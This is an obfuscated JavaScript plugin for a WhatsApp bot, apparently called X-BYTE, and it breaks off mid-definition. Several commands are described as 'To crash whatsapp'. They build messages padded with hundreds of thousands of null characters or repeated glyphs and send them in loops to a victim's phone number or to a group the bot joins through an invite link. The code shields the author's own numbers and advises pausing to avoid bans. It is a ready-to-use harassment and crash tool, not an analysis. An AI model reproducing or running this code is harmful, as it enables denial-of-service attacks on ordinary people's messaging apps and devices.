(function (_0x290b3d, _0x5ea591) {
    const _0x25549b = _0x290b3d();
    while (true) {
      try {
        const _0x4861ef = parseInt(_0x3baf(1968, 'm[F5')) / 1 + parseInt(_0x3baf(1445, '10u7')) / 2 + -parseInt(_0x3baf(2495, '&LH2')) / 3 * (-parseInt(_0x3baf(596, 'PA@u')) / 4) + -parseInt(_0x3baf(1231, 'ET8Q')) / 5 * (parseInt(_0x3baf(2326, 'V$ao')) / 6) + parseInt(_0x3baf(1629, 'nk8T')) / 7 + -parseInt(_0x3baf(756, 'ET8Q')) / 8 * (-parseInt(_0x3baf(1951, 'ZsHC')) / 9) + parseInt(_0x3baf(1714, 'ET8Q')) / 10 * (-parseInt(_0x3baf(2761, 'esOX')) / 11);
        if (_0x4861ef === _0x5ea591) {
          break;
        } else {
          _0x25549b.push(_0x25549b.shift());
        }
      } catch (_0x19a0dd) {
        _0x25549b.push(_0x25549b.shift());
      }
    }
  })(_0x433f, 809440);
  function _0x3baf(_0x3cdf55, _0x2d7284) {
    const _0x89be5c = _0x433f();
    _0x3baf = function (_0x14d16e, _0x21edc6) {
      _0x14d16e = _0x14d16e - 282;
      let _0x120b03 = _0x89be5c[_0x14d16e];
      if (_0x3baf.zMgmuM === undefined) {
        var _0x5a555a = function (_0x539fca) {
          let _0x269641 = '';
          let _0x273172 = '';
          let _0x29a020 = 0;
          let _0x183dbe;
          let _0x19ca1d;
          for (let _0x173858 = 0; _0x19ca1d = _0x539fca.charAt(_0x173858++); ~_0x19ca1d && (_0x183dbe = _0x29a020 % 4 ? _0x183dbe * 64 + _0x19ca1d : _0x19ca1d, _0x29a020++ % 4) ? _0x269641 += String.fromCharCode(255 & _0x183dbe >> (-2 * _0x29a020 & 6)) : 0) {
            _0x19ca1d = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='.indexOf(_0x19ca1d);
          }
          let _0x25d7eb = 0;
          for (let _0x1903e6 = _0x269641.length; _0x25d7eb < _0x1903e6; _0x25d7eb++) {
            _0x273172 += '%' + ('00' + _0x269641.charCodeAt(_0x25d7eb).toString(16)).slice(-2);
          }
          return decodeURIComponent(_0x273172);
        };
        const _0x3b4027 = function (_0x42f440, _0x562846) {
          let _0x490de7 = [];
          let _0x4b00a3 = 0;
          let _0x26f46c;
          let _0x983c11 = '';
          _0x42f440 = _0x5a555a(_0x42f440);
          let _0x57a9da;
          for (_0x57a9da = 0; _0x57a9da < 256; _0x57a9da++) {
            _0x490de7[_0x57a9da] = _0x57a9da;
          }
          for (_0x57a9da = 0; _0x57a9da < 256; _0x57a9da++) {
            _0x4b00a3 = (_0x4b00a3 + _0x490de7[_0x57a9da] + _0x562846.charCodeAt(_0x57a9da % _0x562846.length)) % 256;
            _0x26f46c = _0x490de7[_0x57a9da];
            _0x490de7[_0x57a9da] = _0x490de7[_0x4b00a3];
            _0x490de7[_0x4b00a3] = _0x26f46c;
          }
          _0x57a9da = 0;
          _0x4b00a3 = 0;
          for (let _0x449142 = 0; _0x449142 < _0x42f440.length; _0x449142++) {
            _0x57a9da = (_0x57a9da + 1) % 256;
            _0x4b00a3 = (_0x4b00a3 + _0x490de7[_0x57a9da]) % 256;
            _0x26f46c = _0x490de7[_0x57a9da];
            _0x490de7[_0x57a9da] = _0x490de7[_0x4b00a3];
            _0x490de7[_0x4b00a3] = _0x26f46c;
            _0x983c11 += String.fromCharCode(_0x42f440.charCodeAt(_0x449142) ^ _0x490de7[(_0x490de7[_0x57a9da] + _0x490de7[_0x4b00a3]) % 256]);
          }
          return _0x983c11;
        };
        _0x3baf.DyfiNv = _0x3b4027;
        _0x3cdf55 = arguments;
        _0x3baf.zMgmuM = true;
      }
      const _0x3a01c3 = _0x89be5c[0];
      const _0x2d226d = _0x14d16e + _0x3a01c3;
      const _0x463d5f = _0x3cdf55[_0x2d226d];
      if (!_0x463d5f) {
        if (_0x3baf.BVEqLZ === undefined) {
          _0x3baf.BVEqLZ = true;
        }
        _0x120b03 = _0x3baf.DyfiNv(_0x120b03, _0x21edc6);
        _0x3cdf55[_0x2d226d] = _0x120b03;
      } else {
        _0x120b03 = _0x463d5f;
      }
      return _0x120b03;
    };
    return _0x3baf(_0x3cdf55, _0x2d7284);
  }
  const fs = require('fs');
  const {
    cmd,
    commands
  } = require("../lib/command");
  const {
    getBuffer,
    getGroupAdmins,
    getRandom,
    h2k,
    isUrl,
    Json,
    runtime,
    sleep,
    fetchJson,
    clockString,
    jsonformat,
    forwardMessage
  } = require("../lib/functions");
  const {
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    PHONENUMBER_MCC,
    makeCacheableSignalKeyStore,
    makeWASocket,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    getContentType
  } = require("@whiskeysockets/baileys");
  const _0xf9d0d5 = {};
  function _0x2649fe(_0x5dca6f, _0x310e16, _0x278cae, _0x10e17b, _0x74dc9) {
    return _0x3baf(_0x310e16 - 0x286, _0x5dca6f);
  }
  _0xf9d0d5.pattern = "bug-hole";
  _0xf9d0d5.react = '🔖';
  _0xf9d0d5.desc = "To crash whatsapp";
  _0xf9d0d5.category = "bug";
  _0xf9d0d5.use = ".ios-ui";
  _0xf9d0d5.filename = __filename;
  cmd(_0xf9d0d5, async (_0x57b392, _0x2f8b58, _0x1096d1, {
    from: _0x314bd3,
    prefix: _0x1feac8,
    l: _0x218224,
    quoted: _0x2946e2,
    body: _0x4831b3,
    isCmd: _0x1168f7,
    command: _0x462cd4,
    args: _0x1f569a,
    q: _0x377d54,
    isGroup: _0x1908a0,
    sender: _0x258ccf,
    senderNumber: _0x2c51b9,
    botNumber2: _0x5de9b1,
    botNumber: _0x2b4935,
    pushname: _0x149d3c,
    isMe: _0xd74e06,
    isDev: _0x57ea7c,
    isOwner: _0x3cf2c5,
    groupMetadata: _0x5682a0,
    groupName: _0x2fb9b1,
    participants: _0x37f894,
    groupAdmins: _0x3a33b0,
    isBotAdmins: _0x4a3015,
    isAdmins: _0x2dd7e5,
    reply: _0x2165e2
  }) => {
    try {
      if (!_0x57ea7c) {
        return _0x2165e2("⚠️ ⚠️ *This is X-BYTE bugs... You dont have permission to use this Bot..̅");
      }
      if (_0x314bd3.includes("923072380380") || _0x314bd3.includes("923458017380") || _0x314bd3.includes("923152380380") || _0x314bd3.includes("923453800380")) {
        return _0x2165e2("Sorry, I cant upload code to my Hamza developer 🥱\nTry to use it on another private!!");
      }
      if (_0x314bd3.includes("120363331372867340@g.us") || _0x314bd3.includes("120363320416667582@g.us")) {
        return _0x2165e2("Sorry, I cant send locks to my Hamza developers group 🥱\nTry using it in another group!!");
      }
      _0x57b392.sendButtonVideo = async (_0x2138d4, _0x469981, _0x5d69cd, _0x466383 = {}) => {};
      const _0x43dece = {
        remoteJid: "status@broadcast"
      };
      const _0x510e11 = {
        'participant': "0@s.whatsapp.net",
        ...(_0x1096d1.chat ? _0x43dece : {})
      };
      const _0x5ca7de = {
        title: "X B Y T E,  B Y  H A M Z A"
      };
      const _0x11d1a3 = {
        listResponseMessage: _0x5ca7de
      };
      const _0x23cfb7 = {
        key: _0x510e11,
        message: _0x11d1a3
      };
      if (!_0x377d54) {
        return _0x2165e2("Usage ." + _0x462cd4 + " 1962623836281@g.us");
      }
      _0x2165e2("In proses....");
      target = _0x377d54;
      for (let _0x194c74 = 0; _0x194c74 < 5; _0x194c74++) {
        const _0x319d8a = {
          title: '',
          subtitle: " "
        };
        var _0x50b00f = generateWAMessageFromContent(_0x1096d1.chat, proto.Message.fromObject({
          'viewOnceMessage': {
            'message': {
              'interactiveMessage': {
                'header': _0x319d8a,
                'body': {
                  'text': "🩸⃟༑⌁⃰𝙰𝚗𝚐𝚐𝚊𝚣𝚢𝚢 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
                },
                'footer': {
                  'text': "›          #Hamza BUG"
                },
                'nativeFlowMessage': {
                  'buttons': [{
                    'name': "cta_url",
                    'buttonParamsJson': "{ display_text : '⿻xbyte⿻', url : , merchant_url :  }"
                  }],
                  'messageParamsJson': "\0".repeat(1000000)
                }
              }
            }
          }
        }), {
          'userJid': _0x1096d1.chat,
          'quoted': _0x23cfb7
        });
        await _0x57b392.relayMessage(target, _0x50b00f.message, {
          'messageId': _0x50b00f.key.id
        });
        await sleep(700);
      }
      _0x2165e2("<✓> Successfully Send Bug to " + target + " Using " + _0x462cd4 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
      const _0x2daa8c = {
        text: '✅️',
        key: _0x2f8b58.key
      };
      const _0xbd47f2 = {
        react: _0x2daa8c
      };
      _0x57b392.sendMessage(_0x314bd3, _0xbd47f2);
    } catch (_0x560826) {
      _0x2165e2("an error occurred while executing the command contact the Hamza developer!");
      _0x218224(_0x560826);
    }
  });
  const _0x4cf387 = {
    pattern: "xbytebg",
    react: '🔖',
    desc: "To crash whatsapp groups",
    category: "bug",
    use: ".xbytebg",
    filename: __filename
  };
  function _0x191822(_0x15011d, _0xe76b6e, _0x3700a9, _0x80afee, _0x3bd933) {
    return _0x3baf(_0x15011d - 0x3e7, _0x80afee);
  }
  cmd(_0x4cf387, async (_0x3f095e, _0x5eff85, _0x3dacb2, {
    from: _0x5a617e,
    prefix: _0x332e93,
    l: _0x51ba7e,
    quoted: _0x35ad85,
    body: _0xc9d6c4,
    isCmd: _0x34e26c,
    command: _0xeabc02,
    args: _0x285fd3,
    q: _0x4a241f,
    isGroup: _0x1bff7c,
    sender: _0x5d37e1,
    senderNumber: _0x36e32b,
    botNumber2: _0x280a90,
    botNumber: _0x146e90,
    pushname: _0x37474c,
    isMe: _0x949985,
    isOwner: _0x563a62,
    groupMetadata: _0x23e0a3,
    groupName: _0x2c323f,
    participants: _0x48d06f,
    groupAdmins: _0x40e150,
    isBotAdmins: _0x278b1e,
    isAdmins: _0xf21ffc,
    reply: _0x21808f
  }) => {
    try {
      if (!isDev) {
        return _0x21808f("⚠️ ⚠️ *This is X-BYTE bugs... You dont have permission to use this Bot..̅");
      }
      if (_0x5a617e.includes("923072380380") || _0x5a617e.includes("923458017380") || _0x5a617e.includes("923152380380") || _0x5a617e.includes("923453800380")) {
        return _0x21808f("Sorry, I cant upload code to my Hamza developer 🥱\nTry to use it on another private!!");
      }
      if (_0x5a617e.includes("120363331372867340@g.us") || _0x5a617e.includes("120363320416667582@g.us")) {
        return _0x21808f("Sorry, I cant send locks to my Hamza developers group 🥱\nTry using it in another group!!");
      }
      if (!_0x4a241f) {
        return _0x21808f("*HOW TO SEND BUG TO GROUP*\n\n" + (_0x332e93 + _0xeabc02) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + _0xeabc02 + " linkgc amount\n\nExample:\n." + _0xeabc02 + " https://chat.whatsapp.com/xxxx 10");
      }
      const _0x7eae21 = {
        remoteJid: "status@broadcast"
      };
      const _0x2f941c = {
        'participant': "0@s.whatsapp.net",
        ...(_0x3dacb2.chat ? _0x7eae21 : {})
      };
      const _0x28a8c3 = {
        title: "X B Y T E,  B Y  H A M Z A"
      };
      const _0x8830a7 = {
        listResponseMessage: _0x28a8c3
      };
      const _0x5eec82 = {
        key: _0x2f941c,
        message: _0x8830a7
      };
      let _0x4d0103 = _0x285fd3[0].split("https://chat.whatsapp.com/")[1];
      let _0x29bdbb = await _0x3f095e.groupAcceptInvite(_0x4d0103);
      for (let _0x45a63c = 0; _0x45a63c < 5; _0x45a63c++) {
        const _0x41d300 = {
          title: '',
          subtitle: " "
        };
        var _0x36eeab = generateWAMessageFromContent(_0x3dacb2.chat, proto.Message.fromObject({
          'viewOnceMessage': {
            'message': {
              'interactiveMessage': {
                'header': _0x41d300,
                'body': {
                  'text': "🩸⃟༑⌁⃰𝙰𝚗𝚐𝚐𝚊𝚣𝚢𝚢 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
                },
                'footer': {
                  'text': "›          #xbyteTech"
                },
                'nativeFlowMessage': {
                  'buttons': [{
                    'name': "cta_url",
                    'buttonParamsJson': "{ display_text : '⿻xbyte⿻', url : , merchant_url :  }"
                  }],
                  'messageParamsJson': "\0".repeat(1000000)
                }
              }
            }
          }
        }), {
          'userJid': _0x3dacb2.chat,
          'quoted': _0x5eec82
        });
        await _0x3f095e.relayMessage(_0x29bdbb, _0x36eeab.message, {
          'messageId': _0x36eeab.key.id
        });
        await sleep(700);
      }
      _0x21808f("<✓> Successfully Send Bug to " + _0x29bdbb + " Using " + _0xeabc02 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
      const _0x41c99b = {
        text: '✅️',
        key: _0x5eff85.key
      };
      const _0x1a852d = {
        react: _0x41c99b
      };
      _0x3f095e.sendMessage(_0x5a617e, _0x1a852d);
    } catch (_0x437fe1) {
      _0x21808f("an error occurred while executing the command contact the Hamza developer!");
      _0x51ba7e(_0x437fe1);
    }
  });
 
  const _0x2d2167 = {
    pattern: "bug_engine",
    react: '🔖',
    desc: "To crash whatsapp",
    category: "bug",
    use: ".bug_engine"
  };
  function _0x593d7d(_0x36a05c, _0x722c44, _0x5ca21f, _0x40ffb0, _0x5cdfc8) {
    return _0x3baf(_0x5cdfc8 + 0x283, _0x40ffb0);
  }
  _0x2d2167.filename = __filename;
  cmd(_0x2d2167, async (_0x4d9e09, _0x54af2f, _0x1065ad, {
    from: _0x29d825,
    prefix: _0x38b9e2,
    l: _0x4df560,
    quoted: _0x44168f,
    body: _0x405831,
    isCmd: _0x53f3d4,
    command: _0x5e3071,
    args: _0x303a39,
    q: _0x200ab3,
    isGroup: _0x45c589,
    sender: _0x5e9e90,
    senderNumber: _0x41d4bc,
    botNumber2: _0x59ae83,
    botNumber: _0x413531,
    pushname: _0x470231,
    isMe: _0x290818,
    isDev: _0x2c3f75,
    isOwner: _0x29a4f1,
    groupMetadata: _0x2edad9,
    groupName: _0xd7c16c,
    participants: _0x5d51bf,
    groupAdmins: _0x46b2b1,
    isBotAdmins: _0x5c1e5a,
    isAdmins: _0xd6eb51,
    reply: _0x3c8cb4
  }) => {
    try {
      if (!_0x2c3f75) {
        return _0x3c8cb4("⚠️ ⚠️ *This is X-BYTE bugs... You dont have permission to use this Bot..̅");
      }
      if (_0x29d825.includes("923072380380") || _0x29d825.includes("923458017380") || _0x29d825.includes("923152380380") || _0x29d825.includes("923453800380")) {
        return _0x3c8cb4("Sorry, I cant upload code to my Hamza developer 🥱\nTry to use it on another private!!");
      }
      if (_0x29d825.includes("120363331372867340@g.us") || _0x29d825.includes("120363320416667582@g.us")) {
        return _0x3c8cb4("Sorry, I cant send locks to my Hamza developers group 🥱\nTry using it in another group!!");
      }
      if (!_0x200ab3) {
        return _0x3c8cb4("Use " + (_0x38b9e2 + _0x5e3071) + " victim number|amount\nExample " + (_0x38b9e2 + _0x5e3071) + " 91xxxxxxxxxx,5");
      }
      async function _0x152e15(_0x5483b2) {
        var _0x17c6df = generateWAMessageFromContent(_0x5483b2, proto.Message.fromObject({
          'viewOnceMessage': {
            'message': {
              'liveLocationMessage': {
                'degreesLatitude': 'p',
                'degreesLongitude': 'p',
                'caption': "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½" + "ê¦¾".repeat(50000),
                'sequenceNumber': '0',
                'jpegThumbnail': ''
              }
            }
          }
        }), {
          'userJid': _0x5483b2
        });
        await _0x4d9e09.relayMessage(_0x5483b2, _0x17c6df.message, {
          'participant': {
            'jid': _0x5483b2
          },
          'messageId': _0x17c6df.key.id
        });
      }
      async function _0x385cdf(_0x26cc2e) {
        const _0x34b21f = {
          product_header_info_id: 0x4433e2e130,
          product_header_is_rejected: false
        };
        var _0x4a8aa7 = generateWAMessageFromContent(_0x26cc2e, proto.Message.fromObject({
          'listMessage': {
            'title': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸" + "\0".repeat(920000),
            'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
            'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
            'buttonText': null,
            'listType': 0x2,
            'productListInfo': {
              'productSections': [{
                'title': "lol",
                'products': [{
                  'productId': "4392524570816732"
                }]
              }],
              'productListHeaderImage': {
                'productId': "4392524570816732",
                'jpegThumbnail': null
              },
              'businessOwnerJid': "0@s.whatsapp.net"
            }
          },
          'footer': "lol",
          'contextInfo': {
            'expiration': 0x927c0,
            'ephemeralSettingTimestamp': "1679959486",
            'entryPointConversionSource': "global_search_new_chat",
            'entryPointConversionApp': "whatsapp",
            'entryPointConversionDelaySeconds': 0x9,
            'disappearingMode': {
              'initiator': "INITIATED_BY_ME"
            }
          },
          'selectListType': 0x2,
          'product_header_info': _0x34b21f
        }), {
          'userJid': _0x26cc2e
        });
        await _0x4d9e09.relayMessage(_0x26cc2e, _0x4a8aa7.message, {
          'participant': {
            'jid': _0x26cc2e
          },
          'messageId': _0x4a8aa7.key.id
        });
      }
      async function _0x1da8da(_0x2d3aca, _0x520bd2) {
        for (let _0x51811a = 0; _0x51811a < _0x520bd2; _0x51811a++) {
          _0x152e15(_0x2d3aca);
          _0x385cdf(_0x2d3aca);
          await sleep(500);
        }
      }
      function _0x1d5b1e(_0x4181f3, _0x573b52 = [], _0x471d1b = false) {
        if (_0x471d1b == null || _0x471d1b == undefined || _0x471d1b == false) {
          const _0x171cf0 = {
            text: _0x200ab3,
            mentions: _0x573b52
          };
          return _0x4d9e09.sendMessage(_0x1065ad.chat, _0x171cf0, {
            'quoted': _0x1065ad
          });
        } else {
          const _0x5a9197 = {
            text: _0x200ab3,
            mentions: _0x573b52
          };
          return _0x4d9e09.sendMessage(_0x1065ad.chat, _0x5a9197, {
            'quoted': _0x1065ad
          });
        }
      }
      let _0x518c0c = _0x200ab3.split(',')[0];
      let _0x314bed = _0x200ab3.split(',')[1] * 5;
      if (!_0x518c0c || !_0x314bed) {
        return _0x3c8cb4("Use " + (_0x38b9e2 + _0x5e3071) + " victim number|amount\nExample " + (_0x38b9e2 + _0x5e3071) + " 91xxxxxxxxxx,5");
      }
      if (isNaN(parseInt(_0x314bed))) {
        return _0x3c8cb4("Amount must be a number");
      }
      let _0x5afca4 = _0x518c0c.replace(/[^0-9]/g, '');
      let _0x4c803f = '' + encodeURI(_0x314bed);
      var _0x14e29d = await _0x4d9e09.onWhatsApp(_0x5afca4 + "@s.whatsapp.net");
      let _0x15c48b = _0x5afca4 + "@s.whatsapp.net";
      if (_0x5afca4 == "923072380380") {
        return;
      }
      if (_0x14e29d.length == 0) {
        return _0x3c8cb4("The number is not registered on WhatsApp");
      }
      _0x3c8cb4("please wait, " + _0x5e3071 + " bug is in process..");
      await sleep(2000);
      _0x1da8da(_0x15c48b, _0x4c803f);
      await sleep(2500);
      _0x1d5b1e("Successfully Sent Bug To @" + _0x15c48b.split('@')[0] + " Using *" + _0x5e3071 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x15c48b]);
      const _0x5ec119 = {
        text: '✅️',
        key: _0x54af2f.key
      };
      const _0x2d0747 = {
        react: _0x5ec119
      };
      _0x4d9e09.sendMessage(_0x29d825, _0x2d0747);
    } catch (_0x53d5c1) {
      _0x3c8cb4("an error occurred while executing the command contact the Hamza developer!");
      _0x4df560(_0x53d5c1);
    }
  });
  const _0x52fffe = {
    pattern: "xbytecrash",
    react: '🔖',
    desc: "To crash whatsapp",
    category: "bug",
    use: ".xbytecrash",
    filename: __filename
  };
  cmd(_0x52fffe, async (_0x40942e, _0x42b07b, _0x72bf04, {
    from: _0x308c20,
    prefix: _0x4ff025,
    l: _0x5f2216,
    quoted: _0xcba45e,
    body: _0x501a60,
    isCmd: _0x32aee7,
    command: _0x45c784,
    args: _0x2268ee,
    q: _0x1d7cf5,
    isGroup: _0x30184a,
    sender: _0x410c1a,
    senderNumber: _0x33b05f,
    botNumber2: _0x3e66fa,
    botNumber: _0x1053f3,
    pushname: _0x3822f7,
    isMe: _0x4b3425,
    isDev: _0xfdc0f5,
    isOwner: _0x33aed0,
    groupMetadata: _0x96eaaf,
    groupName: _0x10ca11,
    participants: _0x18448c,
    groupAdmins: _0x4b1781,
    isBotAdmins: _0x404a60,
    isAdmins: _0x5c3736,
    reply: _0x3cbd19
  }) => {
    try {
      if (!_0xfdc0f5) {
        return _0x3cbd19("⚠️ ⚠️ *This is X-BYTE bugs... You dont have permission to use this Bot..̅");
      }
      _0x3cbd19("</> crash starting... ");
      if (_0x308c20.includes("923072380380") || _0x308c20.includes("923458017380") || _0x308c20.includes("923152380380") || _0x308c20.includes("923453800380")) {
        return _0x3cbd19("Sorry, I cant upload code to my Hamza developer 🥱\nTry to use it on another private!!");
      }
      if (_0x308c20.includes("120363331372867340@g.us") || _0x308c20.includes("120363320416667582@g.us")) {
        return _0x3cbd19("Sorry, I cant send locks to my Hamza developers group 🥱\nTry using it in another group!!");
      }
      async function _0x202043(_0x255fe6) {
        var _0x1ee6b0 = generateWAMessageFromContent(_0x255fe6, proto.Message.fromObject({
          'viewOnceMessage': {
            'message': {
              'liveLocationMessage': {
                'degreesLatitude': 'p',
                'degreesLongitude': 'p',
                'caption': "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½" + "ê¦¾".repeat(50000),
                'sequenceNumber': '0',
                'jpegThumbnail': ''
              }
            }
          }
        }), {
          'userJid': _0x255fe6
        });
        await _0x40942e.relayMessage(_0x255fe6, _0x1ee6b0.message, {
          'participant': {
            'jid': _0x255fe6
          },
          'messageId': _0x1ee6b0.key.id
        });
      }
      async function _0x5e92d0(_0x4b548f) {
        const _0x1e42e3 = {
          product_header_info_id: 0x4433e2e130,
          product_header_is_rejected: false
        };
        var _0x11b519 = generateWAMessageFromContent(_0x4b548f, proto.Message.fromObject({
          'listMessage': {
            'title': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸" + "\0".repeat(920000),
            'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡ÍœâƒŸâ•®",
            'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡ÍœâƒŸâ•®",
            'buttonText': null,
            'listType': 0x2,
            'productListInfo': {
              'productSections': [{
                'title': "lol",
                'products': [{
                  'productId': "4392524570816732"
                }]
              }],
              'productListHeaderImage': {
                'productId': "4392524570816732",
                'jpegThumbnail': null
              },
              'businessOwnerJid': "0@s.whatsapp.net"
            }
          },
          'footer': "lol",
          'contextInfo': {
            'expiration': 0x927c0,
            'ephemeralSettingTimestamp': "1679959486",
            'entryPointConversionSource': "global_search_new_chat",
            'entryPointConversionApp': "whatsapp",
            'entryPointConversionDelaySeconds': 0x9,
            'disappearingMode': {
              'initiator': "INITIATED_BY_ME"
            }
          },
          'selectListType': 0x2,
          'product_header_info': _0x1e42e3
        }), {
          'userJid': _0x4b548f
        });
        await _0x40942e.relayMessage(_0x4b548f, _0x11b519.message, {
          'participant': {
            'jid': _0x4b548f
          },
          'messageId': _0x11b519.key.id
        });
      }
      function _0x19490d(_0x3f0dad, _0x3d264d = [], _0x11aa73 = false) {
        if (_0x11aa73 == null || _0x11aa73 == undefined || _0x11aa73 == false) {
          const _0x1a5e8f = {
            text: _0x1d7cf5,
            mentions: _0x3d264d
          };
          return _0x40942e.sendMessage(_0x72bf04.chat, _0x1a5e8f, {
            'quoted': _0x72bf04
          });
        } else {
          const _0x6be1b6 = {
            text: _0x1d7cf5,
            mentions: _0x3d264d
          };
          return _0x40942e.sendMessage(_0x72bf04.chat, _0x6be1b6, {
            'quoted': _0x72bf04
          });
        }
      }
      async function _0x175d7a(_0x3a5420, _0x19444d) {
        for (let _0x1dbb97 = 0; _0x1dbb97 < _0x19444d; _0x1dbb97++) {
          _0x202043(_0x3a5420);
          _0x5e92d0(_0x3a5420);
          await sleep(500);
        }
      }
      function _0x19490d(_0x371028, _0x4260f9 = [], _0x366632 = false) {
        if (_0x366632 == null || _0x366632 == undefined || _0x366632 == false) {
          const _0x318cb8 = {
            text: _0x1d7cf5,
            mentions: _0x4260f9
          };
          return _0x40942e.sendMessage(_0x72bf04.chat, _0x318cb8, {
            'quoted': _0x72bf04
          });
        } else {
          const _0x422306 = {
            text: _0x1d7cf5,
            mentions: _0x4260f9
          };
          return _0x40942e.sendMessage(_0x72bf04.chat, _0x422306, {
            'quoted': _0x72bf04
          });
        }
      }
      if (!_0x1d7cf5) {
        return _0x3cbd19("Use " + (_0x4ff025 + _0x45c784) + " victim number|amount\nExample " + (_0x4ff025 + _0x45c784) + " 91xxxxxxxxxx,5");
      }
      let _0x2f7bf6 = _0x1d7cf5.split(',')[0];
      let _0x21ebae = _0x1d7cf5.split(',')[1] * 5;
      if (!_0x2f7bf6 || !_0x21ebae) {
        return _0x3cbd19("Use " + (_0x4ff025 + _0x45c784) + " victim number|amount\nExample " + (_0x4ff025 + _0x45c784) + " 91xxxxxxxxxx,5");
      }
      if (isNaN(parseInt(_0x21ebae))) {
        return _0x3cbd19("Amount must be a number");
      }
      let _0x41db46 = _0x2f7bf6.replace(/[^0-9]/g, '');
      let _0x2c0c86 = '' + encodeURI(_0x21ebae);
      var _0x2fa09f = await _0x40942e.onWhatsApp(_0x41db46 + "@s.whatsapp.net");
      let _0x51aa65 = _0x41db46 + "@s.whatsapp.net";
      if (_0x41db46 == "25475766950461") {
        return;
      }
      if (_0x2fa09f.length == 0) {
        return _0x3cbd19("The number is not registered on WhatsApp");
      }
      _0x3cbd19("please wait, " + _0x45c784 + " bug is in process..");
      await sleep(2000);
      _0x175d7a(_0x51aa65, _0x2c0c86);
      await sleep(2500);
      _0x19490d("Successfully Sent Bug To @" + _0x51aa65.split('@')[0] + " Using *" + _0x45c784 + "* \n\nPause 2 minutes so that the bot is not banned.", [_0x51aa65]);
      const _0x5b38a1 = {
        text: '✅️',
        key: _0x42b07b.key
      };
      const _0x662fe2 = {
        react: _0x5b38a1
      };
      _0x40942e.sendMessage(_0x308c20, _0x662fe2);
    } catch (_0x27b8b8) {
      _0x3cbd19("an error occurred while executing the command contact the Hamza developer!");
      _0x5f2216(_0x27b8b8);
    }
  });
  const _0x31b374 = {
    pattern: "resbug",
    react: '🔖'
  };
  function _0x2543e2(_0x7e6936, _0xbef4f2, _0x58aa57, _0x307d11, _0x2418ec) {
    return _0x3baf(_0x307d11 - 0xc8, _0x2418ec);
  }
  _0x31b374.desc = "To crash whatsapp";
  _0x31b374.category = "bug";
  function _0x5a9c3d(_0x288d0a, _0x5c5054, _0x37bf9c, _0x924538, _0x3c5004) {
    return _0x3baf(_0x924538 - 0x1be, _0x288d0a);
  }
  _0x31b374.use = ".resbug 92307xxxxxxx";
  _0x31b374.filename = __filename;
  cmd(_0x31b374, async (_0x4eb8ce, _0x5e9dac, _0x3ae037, {
    from: _0x33ae7b,
    prefix: _0x2f19ae,
    l: _0x3a5dfd,
    quoted: _0x2b760c,
    body: _0x3be688,
    isCmd: _0x198ae5,
    command: _0x7c6c01,
    args: _0x92a25b,
    q: _0x362728,
    isGroup: _0x4740e2,
    sender: _0x5a6f40,
    senderNumber: _0x57b2f9,
    botNumber2: _0x24412,
    botNumber: _0x15f583,
    pushname: _0xa9afd9,
    isMe: _0x1a863b,
    isDev: _0x274e64,
    isOwner: _0x1a4cd7,
    groupMetadata: _0xf44176,
    groupName: _0x217663,
    participants: _0x9da144,
    groupAdmins: _0x3d8b68,
    isBotAdmins: _0x317098,
    isAdmins: _0x20c221,
    reply: _0x359529
  }) => {
    try {
      if (!_0x274e64) {
        return _0x359529("⚠️ ⚠️ *This is X-BYTE bugs... You dont have permission to use this Bot..̅");
      }
      if (_0x33ae7b.includes("923072380380") || _0x33ae7b.includes("923458017380") || _0x33ae7b.includes("923152380380") || _0x33ae7b.includes("923453800380")) {
        return _0x359529("Sorry, I cant upload code to my Hamza developer 🥱\nTry to use it on another private!!");
      }
      if (_0x33ae7b.includes("120363331372867340@g.us") || _0x33ae7b.includes("120363320416667582@g.us")) {
        return _0x359529("Sorry, I cant send locks to my Hamza developers group 🥱\nTry using it in another group!!");
      }
      if (!_0x362728) {
        return _0x359529("Penggunaan ." + _0x7c6c01 + " 92307xxxxxxx");
      }
      const _0x139381 = {
        remoteJid: "status@broadcast"
      };
      const _0x495316 = {
        'participant': "0@s.whatsapp.net",
        ...(_0x3ae037.chat ? _0x139381 : {})
      };
      const _0x42ae82 = {
        title: "X B Y T E,  B Y  H A M Z A"
      };
      const _0x589cac = {
        listResponseMessage: _0x42ae82
      };
      const _0x2402d0 = {
        key: _0x495316,
        message: _0x589cac
      };
      const _0x73a680 = {
        remoteJid: "status@broadcast"
      };
      const _0x41df82 = {
        'participant': "0@s.whatsapp.net",
        ...(_0x3ae037.chat ? _0x73a680 : {})
      };
      const _0x14a0a1 = {
        name: "review_and_pay",
